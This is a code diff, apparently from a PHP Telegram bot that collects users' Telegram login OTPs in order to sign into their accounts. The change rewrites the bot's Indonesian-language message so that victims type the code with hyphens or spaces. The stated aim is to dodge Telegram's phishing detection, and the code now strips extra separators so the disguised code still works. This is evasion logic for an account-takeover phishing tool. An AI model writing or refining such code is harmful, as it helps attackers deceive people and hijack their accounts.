@@ -255,8 +255,12 @@ if (isset($update['message'])) {
 
             sendMessage($chat_id,
                 "📩 <b>Kode OTP Telah Dikirim!</b>\n\n".
-                "Telegram telah mengirimkan kode verifikasi ke aplikasi Telegram kamu (bukan SMS).\n\n".
-                "👉 <b>Silakan ketik dan kirimkan kode OTP tersebut ke sini.</b>"
+                "Telegram resmi mengirimkan pesan berisi kode verifikasi ke aplikasimu.\n\n".
+                "⚠️ <b>PENTING: JANGAN KIRIM KODE SECARA LANGSUNG!</b>\n".
+                "Telegram akan <b>MEMBLOKIR</b> login jika kamu mengirim kode sebagai angka biasa ke chat ini (deteksi Phishing).\n\n".
+                "👉 <b>Ketik kode dengan tanda hubung atau spasi di setiap angkanya.</b>\n".
+                "Contoh jika kode <code>12345</code>, ketik:\n".
+                "<code>1-2-3-4-5</code> atau <code>1 2 3 4 5</code>"
             );
         } catch (\Exception $e) {
             write_log('MTPROTO_ERR', "PhoneLogin error ($phone): " . $e->getMessage());
@@ -268,7 +272,7 @@ if (isset($update['message'])) {
 
     // STATE: WAIT_OTP (Waiting for Telegram OTP Code)
     if ($session && $session['status'] === 'wait_otp') {
-        $otp = trim(str_replace([' ', '-'], '', $text));
+        $otp = trim(str_replace([' ', '-', '_', '.', ','], '', $text));
         
         sendMessage($chat_id, "🔄 <i>Sedang memverifikasi OTP...</i>");
         
